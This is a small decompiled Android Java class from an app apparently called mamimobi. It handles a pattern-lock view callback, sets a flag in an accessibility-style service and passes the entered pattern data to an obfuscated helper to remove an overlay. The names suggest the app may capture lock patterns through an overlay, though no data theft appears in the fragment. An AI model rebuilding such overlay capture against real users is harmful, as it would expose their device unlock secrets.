package defpackage;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import com.mamimobi.AccessService;
import com.mamimobi.videostream.view.PatternLockView;
import java.util.ArrayList;

/* JADX INFO: loaded from: classes.dex */
public final class nk0 {
    public final /* synthetic */ PatternLockView a;

    public nk0(PatternLockView patternLockView) {
        this.a = patternLockView;
    }

    public final void a(ArrayList arrayList) {
        boolean z = true;
        AccessService.n0.set(true);
        try {
            this.a.V.remove(this);
            if (Looper.myLooper() != Looper.getMainLooper()) {
                z = false;
            }
            if (!z) {
                new Handler(Looper.getMainLooper()).post(new e(24, arrayList));
            } else {
                pk0.e();
                pk0.a(arrayList);
            }
        } catch (Exception e) {
            Log.e("PatternLockHelper", "remove overlay failed", e);
        }
    }
}
